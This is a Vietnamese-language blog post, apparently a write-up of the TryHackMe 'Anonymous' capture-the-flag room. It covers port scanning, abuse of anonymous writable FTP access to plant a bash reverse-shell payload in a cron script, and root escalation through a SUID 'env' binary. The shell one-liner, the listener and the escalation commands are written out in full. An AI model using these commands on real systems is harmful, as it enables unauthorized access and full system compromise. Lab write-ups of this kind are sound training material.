---
title: "Tryhackme - Anonymous"
date: "2021-10-27"
tags: [
    "ftp",
    "linux",
    "smb",
]
---

Hôm nay tôi sẽ giải CTF [Tryhackme - Anonymous](https://tryhackme.com/room/anonymous).

## Reconnaissance

Vẫn như thông thường thôi, việc đầu tiên cần làm là quét cổng. 

```python
┌──(neo㉿kali)-[~]
└─$ rustscan -a 10.10.135.18 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.135.18:21
Open 10.10.135.18:22
Open 10.10.135.18:139
Open 10.10.135.18:445
```

Ở đây tôi có port 139 và 445, 2 port sử dụng trong SMB của Windows. À trước đó thì thử truy cập vào port 21 với Anonymous xem có gì hay ho không.

```python
ftp> ls
229 Entering Extended Passive Mode (|||36762|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||60923|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1634 Jul 30 08:50 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Nhìn vào phân quyền của */scripts/* và file *clean.sh* thì tôi có thể sửa file. Lấy các file này về và thử kiểm tra thì tôi nhận ra đây file clean.sh chạy liên tục để ghi dữ liệu vào file *removed_files.log*. 

Từ 2 điều này tôi nghĩ rằng mình có thể thêm payload vào file thực thi sau đó put lại lên ftp server, file thực thi sẽ chạy payload và tôi sẽ có shell. Tôi dùng payload của [pentestmonkey](https://pentestmonkey.net/): `bash -i >& /dev/tcp/10.10.135.18/12345 0>&1`

Trước khi put file thì tạo listner từ local machine: `nc -lnvp 12345`

```python
ftp> put /home/neo/THM-Anonymous/clean.sh clean.sh
local: /home/neo/THM-Anonymous/clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||14310|)
150 Ok to send data.
100% |************************************************************************************************************************************************|   356        5.30 MiB/s    00:00 ETA
226 Transfer complete.
```
```python
┌──(neo㉿kali)-[~/THM-Anonymous]
└─$ nc -lnvp 12345
listening on [any] 12345 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.135.18] 34374
bash: cannot set terminal process group (1460): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ ls
pics
user.txt
namelessone@anonymous:~$ 
```

Vậy là tôi có __user flag__.

## Privilege escalation

Tôi thử `sudo -l` nhưng bị yêu cầu password, bỏ qua cách này. Tôi để ý còn thư mục *pics*, trong này có 2 file ảnh, tôi sẽ tạo http server trên đây và *wget* 2 file này về để xem có gì đặc biệt không. Và sau 1 lúc thì không =))))

Tôi còn 1 cách khác là tìm progame với SUID của root: `find / -type f -perm -u=s 2>/dev/null`, và nó ra 1 list rất nhiều thứ, nhưng thứ đập vào mắt tôi là `/usr/bin/env`. `env` là lệnh cho phép chạy 1 chương trình khác trong môi trường tùy chỉnh mà không cần thay đổi chương tình đang chạy hiện tại. Nó khá hữu ích khi chúng ta muốn có 1 môi trường ảo để test các chương trình hay cài đặt các packages mà không muốn nó gây ảnh hưởng đến hệ thống đang hoạt động.

Tôi vào [GTFOBins](https://gtfobins.github.io/) và tìm thấy env có SUID, thử xem sao.

```python
namelessone@anonymous:~$ env /bin/sh -p
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# whoami
root
# ls /root
root.txt
# 
```

## Conclusion

Qua bài này tôi biết thêm về `env` và cách leo thang đặc quyền với SUID. Còn lại thì cũng không có gì mới lắm.

- Đọc thêm về [env](https://stackoverflow.com/questions/43793040/how-does-usr-bin-env-work-in-a-linux-shebang-line)
- Đọc thêm về [SUID](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd)


